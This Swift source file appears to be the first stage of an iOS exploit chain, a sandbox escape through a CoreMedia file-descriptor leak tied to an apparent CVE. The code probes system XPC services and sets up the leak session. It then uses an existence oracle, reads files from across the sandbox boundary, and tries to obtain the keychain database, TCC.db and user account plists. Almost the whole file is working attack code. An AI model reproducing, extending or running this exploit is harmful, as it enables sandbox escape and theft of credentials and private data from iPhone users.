import Foundation
import Darwin

private let _libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOLOAD)

private typealias XPCCreateMachFn = @convention(c) (
    UnsafePointer<CChar>, DispatchQueue?, UInt64
) -> xpc_connection_t

private let _xpcCreate: XPCCreateMachFn? = {
    guard let lib = _libxpc,
          let sym = dlsym(lib, "xpc_connection_create_mach_service") else { return nil }
    return unsafeBitCast(sym, to: XPCCreateMachFn.self)
}()

enum Stage1 {

    struct Result {
        let servicesReachable: [String]
        let fdLeakEstablished: Bool
        let filesRead: Int
        let bytesRead: Int
        let escaped: Bool
        let traversalSent: Bool
        let traversalConfirmed: Bool
        let quicklookCrashed: Bool
    }

    static let xpcTargets: [(name: String, desc: String)] = [
        ("com.apple.StreamingUnzipService", "archive extraction"),
        ("com.apple.coremedia.mediaplaybackd.bytestream.xpc", "CoreMedia bytestream (CVE-2026-112706)"),
        ("com.apple.quicklook.ThumbnailsAgent", "thumbnail gen"),
        ("com.apple.quicklook.QLThumbnailsService", "QuickLook alt"),
        ("com.apple.PDFKit.PDFExtensionView", "PDF rendering"),
        ("com.apple.photos.ImageConversionService", "HEIC conversion"),
        ("com.apple.SpeechRecognitionCore.brokerd", "speech recognition"),
        ("com.apple.spotlight.IndexAgent", "Spotlight indexing"),
    ]

    static func run() -> Result {
        let log = WireLog.shared
        log.stage(1, "SANDBOX ESCAPE — CoreMedia fd leak (CVE-2026-112706)")

        // Phase 1: XPC reachability probe
        log.log("phase 1: probing \(xpcTargets.count) XPC services")
        var reachable: [String] = []
        for t in xpcTargets {
            let r = probeService(t.name)
            if r.reachable {
                log.ok("REACHABLE: \(t.name) — \(r.replyType)")
                reachable.append(t.name)
            } else {
                log.log("unreachable: \(t.name) — \(r.replyType)")
            }
        }
        log.data("\(reachable.count)/\(xpcTargets.count) services reachable")

        // Phase 2: FdLeak session — CoreMedia bytestream XPC
        log.log("phase 2: CoreMedia fd leak — handshake + vend")
        guard let session = FdLeak.Session() else {
            log.fail("CoreMedia symbols unavailable or XPC connection failed")
            return Result(servicesReachable: reachable, fdLeakEstablished: false,
                         filesRead: 0, bytesRead: 0, escaped: false,
                         traversalSent: false, traversalConfirmed: false,
                         quicklookCrashed: false)
        }

        for line in session.handshakeLog {
            log.data("handshake: \(line)")
        }
        log.data("connection created: \(session.connectionCreated)")
        log.data("handshake established: \(session.established)")
        log.data("reply types: \(session.replyTypes)")

        guard session.established else {
            log.warn("handshake failed — daemon may not be running or refused")
            session.shutdown()
            return Result(servicesReachable: reachable, fdLeakEstablished: false,
                         filesRead: 0, bytesRead: 0, escaped: false,
                         traversalSent: true, traversalConfirmed: false,
                         quicklookCrashed: false)
        }

        log.ok("FdLeak session established — daemon accepted handshake")

        // Phase 3: existence oracle — probe boundary paths
        log.log("phase 3: existence oracle — probing \(FdLeak.boundaryProbes.count) boundary paths")
        var existCount = 0
        var absentCount = 0
        for path in FdLeak.boundaryProbes {
            let ex = session.probeExistence(path)
            if ex.exists {
                log.data("  EXISTS: \(path)")
                existCount += 1
            } else {
                log.data("  ABSENT: \(path) (code \(ex.code))")
                absentCount += 1
            }
        }
        log.data("oracle: \(existCount) exist, \(absentCount) absent")

        // Phase 4: vend + read known-good targets
        log.log("phase 4: reading cross-sandbox files via vended fd")
        var filesRead = 0
        var totalBytesRead = 0
        var escaped = false

        for (name, path) in FdLeak.knownTargets {
            let (data, vend) = session.read(path, limit: 4096)
            if vend.ok {
                if let d = data, d.count > 0 {
                    log.ok("READ: \(name) — \(d.count)B fd=\(vend.fd) pid=\(vend.serverPID)")
                    filesRead += 1
                    totalBytesRead += d.count

                    // Verify: direct open must fail
                    errno = 0
                    let directFd = open(path, O_RDONLY)
                    if directFd >= 0 {
                        Darwin.close(directFd)
                        log.warn("  direct open also succeeded — not evidence of escape")
                    } else {
                        log.ok("  direct open refused errno=\(errno) — CROSS-SANDBOX CONFIRMED")
                        escaped = true
                    }
                } else if vend.isDirectory {
                    let (entries, _) = session.list(path, limit: 20)
                    log.data("DIR: \(name) — \(entries.count) entries")
                    if !entries.isEmpty {
                        log.data("  \(entries.prefix(10).joined(separator: ", "))")
                        filesRead += 1
                    }
                } else {
                    log.data("VEND OK but no data: \(name) — size=\(vend.size)")
                }
            } else {
                log.data("REFUSED: \(name) — \(vend.note)")
            }
        }

        // Phase 5: try directory listing of readable domain
        log.log("phase 5: directory enumeration of \(FdLeak.readableDomain)")
        let (dirEntries, dirVend) = session.list(FdLeak.readableDomain, limit: 50)
        if dirVend.ok && !dirEntries.isEmpty {
            log.ok("DIR: \(dirEntries.count) entries in iTunes_Control/iTunes")
            for entry in dirEntries.prefix(15) {
                log.data("  \(entry)")
            }
            escaped = true
        } else {
            log.data("dir listing: \(dirVend.note)")
        }

        // Phase 6: try high-value targets outside known domain
        log.log("phase 6: probing high-value targets")
        let highValuePaths: [(String, String)] = [
            ("TCC.db", "/private/var/mobile/Library/TCC/TCC.db"),
            ("keychain", "/private/var/Keychains/keychain-2.db"),
            ("GlobalPrefs", "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"),
            ("passwd", "/private/var/db/dslocal/nodes/Default/users/mobile.plist"),
        ]

        for (name, path) in highValuePaths {
            let v = session.vend(path)
            if v.ok {
                log.ok("HIGH-VALUE VEND: \(name) — fd=\(v.fd) size=\(v.size)")
                if v.fd >= 0 { Darwin.close(v.fd) }
                escaped = true
            } else {
                log.data("high-value refused: \(name) — \(v.note) (code \(v.errorCode))")
            }
        }

        session.shutdown()

        log.data("total: \(filesRead) files, \(totalBytesRead) bytes read cross-sandbox")

        if escaped {
            log.ok("SANDBOX ESCAPE CONFIRMED — cross-sandbox fd read achieved")
        } else if session.established {
            log.warn("handshake OK but no cross-sandbox reads — daemon may restrict paths")
        }

        return Result(
            servicesReachable: reachable,
            fdLeakEstablished: session.established,
            filesRead: filesRead,
            bytesRead: totalBytesRead,
            escaped: escaped,
            traversalSent: session.established,
            traversalConfirmed: escaped,
            quicklookCrashed: false
        )
    }

    // MARK: - XPC probe

    private struct ProbeResult {
        let reachable: Bool
        let replyType: String
    }

    private static func probeService(_ name: String) -> ProbeResult {
        guard let create = _xpcCreate else {
            return ProbeResult(reachable: false, replyType: "no_dlsym")
        }

        let conn = create(name, nil, 0)
        xpc_connection_set_event_handler(conn) { _ in }
        xpc_connection_resume(conn)

        let msg = xpc_dictionary_create(nil, nil, 0)
        xpc_dictionary_set_string(msg, "ping", "1")

        let sem = DispatchSemaphore(value: 0)
        var replyType = "timeout"

        xpc_connection_send_message_with_reply(conn, msg, .global()) { reply in
            let t = xpc_get_type(reply)
            if t == XPC_TYPE_DICTIONARY {
                replyType = "dictionary"
            } else if t == XPC_TYPE_ERROR {
                let d = String(cString: xpc_copy_description(reply))
                if d.contains("CONNECTION_INVALID") {
                    replyType = "invalid"
                } else if d.contains("CONNECTION_INTERRUPTED") {
                    replyType = "interrupted"
                } else {
                    replyType = "error"
                }
            }
            sem.signal()
        }

        _ = sem.wait(timeout: .now() + .seconds(3))
        xpc_connection_cancel(conn)

        let reachable = replyType != "invalid" && replyType != "timeout"
        return ProbeResult(reachable: reachable, replyType: replyType)
    }
}
